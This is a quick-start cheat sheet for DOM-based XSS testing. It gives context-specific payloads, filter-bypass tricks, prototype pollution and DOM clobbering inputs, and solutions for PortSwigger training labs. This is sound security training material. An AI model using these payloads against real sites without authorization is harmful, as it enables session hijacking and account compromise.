# DOM-Based Vulnerabilities Quick Start Guide

## Fast Track to Finding DOM XSS

### 1. Quick Identification (5 minutes)

**Check for AngularJS:**
```
View source → Look for: ng-app, angular.js
Payload: {{$on.constructor('alert(1)')()}}
```

**Check for jQuery:**
```
Console: typeof jQuery or typeof $
Payload for $(selector): <img src=x onerror=alert(1)>
```

**Check URL parameters:**
```
Search box → Submit → Check URL
Parameter reflects → Test payload
```

### 2. Common Injection Points

| Location | Source | Test |
|----------|--------|------|
| Search box | `location.search` | `?q=<img src=x onerror=alert(1)>` |
| URL fragment | `location.hash` | `#<img src=x onerror=alert(1)>` |
| Form inputs | Various | Submit with payload |
| postMessage | `event.data` | iframe + postMessage |

### 3. Context-Based Payloads

**HTML Context:**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**innerHTML Sink:**
```html
<img src=1 onerror=alert(1)>
```
*Note: `<script>` tags don't work!*

**jQuery href:**
```
javascript:alert(document.cookie)
```

**AngularJS:**
```javascript
{{$on.constructor('alert(1)')()}}
```

**Inside Select:**
```html
"></select><img src=x onerror=alert(1)>
```

### 4. PortSwigger Labs Speed Run

#### Lab 1: document.write
```
URL: /?search="><svg onload=alert(1)>
Time: 30 seconds
```

#### Lab 2: innerHTML
```
URL: /?search=<img src=1 onerror=alert(1)>
Time: 30 seconds
```

#### Lab 3: jQuery href
```
URL: /feedback?returnPath=javascript:alert(document.cookie)
Click: "Back" link
Time: 1 minute
```

#### Lab 4: hashchange
```
Exploit Server Body:
<iframe src="LAB-URL/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

Time: 2 minutes
```

#### Lab 5: AngularJS
```
URL: /?search={{$on.constructor('alert(1)')()}}
Time: 1 minute
```

#### Lab 6: Select element
```
URL: /product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
Time: 1 minute
```

#### Lab 7: Web messages
```
Exploit Server Body:
<iframe src="LAB-URL/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"></iframe>

Time: 2 minutes
```

#### Lab 8: JavaScript URL
```
Exploit Server Body:
<iframe src="LAB-URL/" onload="this.contentWindow.postMessage('javascript:print()//https:','*')"></iframe>

Time: 2 minutes
```

#### Lab 9: JSON.parse
```
Exploit Server Body:
<iframe src="LAB-URL/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'></iframe>

Time: 2 minutes
```

#### Lab 10: Prototype pollution
```
With DOM Invader:
1. Scan for prototype pollution
2. Scan for gadgets
3. Click "Exploit"
Time: 2 minutes

Manual:
URL: /?__proto__[transport_url]=data:,alert(1);//
Time: 3 minutes
```

#### Lab 11: Prototype pollution (alternative)
```
URL: /?__proto__.sequence=alert(1)-
Time: 2 minutes
```

#### Lab 12: DOM clobbering
```
Comment:
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

Post second comment to trigger
Time: 3 minutes
```

#### Lab 13: DOM clobbering (attributes)
```
Comment:
<form id=x tabindex=0 onfocus=print()><input id=attributes></form>

Exploit Server:
<iframe src="LAB-URL/post?postId=3" onload="setTimeout(()=>this.src=this.src+'#x',500)"></iframe>

Time: 4 minutes
```

### 5. Burp Suite DOM Invader Quick Setup

1. **Enable:** F12 → DOM Invader tab → Toggle ON
2. **Auto-inject:** Enable "Inject URL params"
3. **Check sinks:** Review "Sinks" panel
4. **Scan pollution:** Click "Scan for prototype pollution"
5. **Scan gadgets:** Click "Scan for gadgets"
6. **Exploit:** Click "Exploit" button

**Total time:** 1 minute setup

### 6. Quick Wins

**Always try first:**
```html
1. <img src=x onerror=alert(1)>
2. <svg onload=alert(1)>
3. "><script>alert(1)</script>
4. javascript:alert(1)
5. {{$on.constructor('alert(1)')()}}
```

**For innerHTML specifically:**
```html
<img src=1 onerror=alert(1)>
```

**For hash-based:**
```
Create iframe with hash change trigger
```

**For postMessage:**
```html
<iframe src="URL" onload="this.contentWindow.postMessage('PAYLOAD','*')"></iframe>
```

### 7. Common Mistakes to Avoid

- ❌ Using `<script>` tags with innerHTML
- ❌ Forgetting to close tags when breaking out
- ❌ Not clicking links for href-based XSS
- ❌ Testing hashchange without iframe wrapper
- ❌ Forgetting the `//` comment in prototype pollution
- ❌ Using wrong parameter names

### 8. Quick Detection Script

**Run in browser console:**
```javascript
// Quick DOM XSS detector
(function(){
    let risks = [];

    // Check sources
    if (document.body.innerHTML.includes(location.search.slice(1)))
        risks.push('URL param reflected');
    if (document.body.innerHTML.includes(location.hash.slice(1)))
        risks.push('Hash reflected');

    // Check frameworks
    if (typeof angular !== 'undefined')
        risks.push('AngularJS detected');
    if (typeof jQuery !== 'undefined')
        risks.push('jQuery detected');

    // Check for postMessage
    let scripts = [...document.scripts].map(s => s.textContent).join('');
    if (scripts.includes('addEventListener') && scripts.includes('message'))
        risks.push('postMessage listener found');

    if (risks.length) {
        console.log('%c[!] Potential DOM XSS vectors:', 'color:red;font-weight:bold');
        risks.forEach(r => console.log('  - ' + r));
    } else {
        console.log('%c[✓] No obvious DOM XSS vectors', 'color:green');
    }
})();
```

### 9. Payload Encoding Quick Reference

**HTML encoding:**
```
< = &lt; or &#60; or &#x3C;
> = &gt; or &#62; or &#x3E;
" = &quot; or &#34;
```

**URL encoding:**
```
< = %3C
> = %3E
" = %22
' = %27
space = %20 or +
```

**JavaScript Unicode:**
```
alert = \u0061\u006c\u0065\u0072\u0074
```

### 10. Quick Bypass Techniques

**Filter bypasses:**
```html
<!-- If <script> is blocked -->
<svg onload=alert(1)>
<img src=x onerror=alert(1)>

<!-- If alert is blocked -->
<img src=x onerror=window['ale'+'rt'](1)>

<!-- If ( is blocked -->
<svg onload=alert`1`>

<!-- If quotes are blocked -->
<img src=x onerror=alert(1)>
```

### 11. Speed Testing Workflow

**1 minute test:**
1. Find input field
2. Submit: `<img src=x onerror=alert(1)>`
3. Check if it executes
4. Done

**5 minute test:**
1. Test all input fields
2. Test URL parameters
3. Test hash fragments
4. Check browser console for errors
5. Review JavaScript files

**15 minute test:**
1. All above
2. Enable DOM Invader
3. Scan for prototype pollution
4. Check for postMessage listeners
5. Test with Burp Intruder
6. Review all JavaScript for sinks

### 12. Cheat Sheet URLs

**Fastest lab solutions:**
```
Lab 1: /?search="><svg onload=alert(1)>
Lab 2: /?search=<img src=1 onerror=alert(1)>
Lab 3: /feedback?returnPath=javascript:alert(document.cookie)
Lab 5: /?search={{$on.constructor('alert(1)')()}}
Lab 6: /product?productId=1&storeId="></select><img src=1 onerror=alert(1)>
Lab 10: /?__proto__[transport_url]=data:,alert(1);//
Lab 11: /?__proto__.sequence=alert(1)-
```

### 13. One-Liner Tests

```bash
# Test URL parameter
curl "https://target.com/?q=<img src=x onerror=alert(1)>" | grep -i "img src=x"

# Test all parameters
for p in id user search q; do
  curl "https://target.com/?$p=TEST123" | grep -i "TEST123" && echo "[+] $p reflects"
done
```

### 14. Bug Bounty Quick Wins

**High-value targets:**
- Payment pages (sensitive data)
- Admin panels (privilege escalation)
- File upload forms (stored XSS)
- Search functionality (common entry point)
- postMessage handlers (often overlooked)

**Quick checks:**
1. Search box → Payload → Execute? → Report
2. Hash fragment → Payload → Execute? → Report
3. Prototype pollution → Gadget → XSS? → Report

**Report template:**
```
Title: DOM XSS in [location]
Severity: High
Steps:
1. Navigate to [URL]
2. Inject payload: [PAYLOAD]
3. Observe XSS execution
Impact: Cookie theft, session hijacking, etc.
```

### 15. Time-Saving Tips

- **Use DOM Invader:** Automates 80% of detection
- **Copy-paste payloads:** Don't type them manually
- **Test in order:** Start with simplest payloads first
- **Browser snippets:** Save common test scripts
- **Burp macros:** Automate login and navigation
- **Practice labs:** Speed comes from repetition

**Target time per lab:** 1-3 minutes
**Total for all 17 labs:** ~45 minutes

---

## Quick Reference Card

| Sink | Payload |
|------|---------|
| document.write | `"><svg onload=alert(1)>` |
| innerHTML | `<img src=x onerror=alert(1)>` |
| jQuery $() | `<img src=x onerror=alert(1)>` |
| jQuery .attr(href) | `javascript:alert(1)` |
| AngularJS | `{{$on.constructor('alert(1)')()}}` |
| eval() | `alert(1)` |
| postMessage | iframe + postMessage |
| Prototype pollution | `/?__proto__[prop]=value` |
| DOM clobbering | `<a id=var><a id=var name=prop>` |

**Most versatile payload:**
```html
<img src=x onerror=alert(1)>
```

**Works in:** Most contexts, innerHTML, jQuery, document.write

---

**Pro Tip:** Practice all 17 labs in sequence until you can complete them in under 30 minutes total. This builds muscle memory for real-world testing.
